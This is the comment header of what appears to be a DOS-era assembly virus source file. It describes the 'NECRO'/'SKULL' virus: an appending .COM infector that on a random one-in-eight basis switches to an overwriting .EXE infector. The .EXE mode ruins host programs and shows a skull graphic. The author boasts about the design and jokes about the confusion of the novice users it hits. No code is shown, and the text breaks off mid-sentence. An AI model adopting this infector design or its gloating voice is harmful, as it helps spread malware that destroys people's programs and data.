; Here's a virus that's actually two viruses in one.  The main virus is a
; a direct action, appending .COM infector.  It will search the system path
; for .COMs to infect, and may infect files on the path in preference to 
; to those in the current directory (if no path is set, it stays in the
; current directory).  Roughly one out of every eight infections (on a ran-
; dom basis) will be non-standard.  In these infections, NECRO will toggle to 
; an overwriting .EXE infector.  
;   
;  
; This .EXE infector is composed of much of the same code as the 
; COM infector -- the virus alternates between the two modes of infection 
; using a 'master switch' which is hooked up to a simple randomization 
; engine.  The master switch, when thrown, trips a series of auxilliary
; switches which alter the virus' behavior.  This saves on bytes and is 
; therefore much better than having the virus drop an entirely independent
; .EXE overwriter.  I hope to expand upon this 'self-programming' concept
; in future viruses.
  
; Infected .COM's should function as intended after the viral code appended to 
; them has finished doing its thing. But infected .EXE's are ruined.  These 
; (provided they are under about 64K in length) will, when executed, pass 
; their illness on to the next uninfected .EXE within the current directory, 
; displaying the following graphic & message:

;   ммллллллллмм           
; млллллВлллллллл        
;олВлллллллллллллн   You cant execute this file:         
;олллллВВлллп   л    Its already dead!           
; ллллллВВллмммлп          
;  ллллВВпВллллн           
;   ппллВВмоВлллн          
;           ВВннн              
 
; SKULL will then return the baffled user to the DOS prompt. I leave it to  
; your imagination to picture the consternation on the novice's face 
; as he tries to isolate the source of this overwriting infection which 
; seems to pop up again and again in different directories.  A very 
; observant user may notice a file length increase of exactly 666 bytes in 
; infected .COM's.  Infected .EXE's will not increase in length unless they  
; are less than ~200 bytes to begin with.  Note that overwritten .EXE's larger  
; than 64K will fail to load and will be non-infectious. Like Popoolar 
; Science, the virus renders these programs into a .COM-like in structure. 
; DOS will NOT execute these files.  In any case, the programs are ruined  
; by SKULL.  As of this release, NECRO avoids files that are read-only or 
; hidden, so these files are be safe from the virus (for now...)

  ;O.K. -- Now here's an important 'architectural' point:  The following

  ;appender (that viral code jumps over it).  It will, however be the first 
  ;thing executed within overwritten EXE files.  Why?  Because in EXE infec-
  ;tion mode, everything from EXFECT on down (but nothing previous) is 
  ;written over the beginning of the EXE host file.
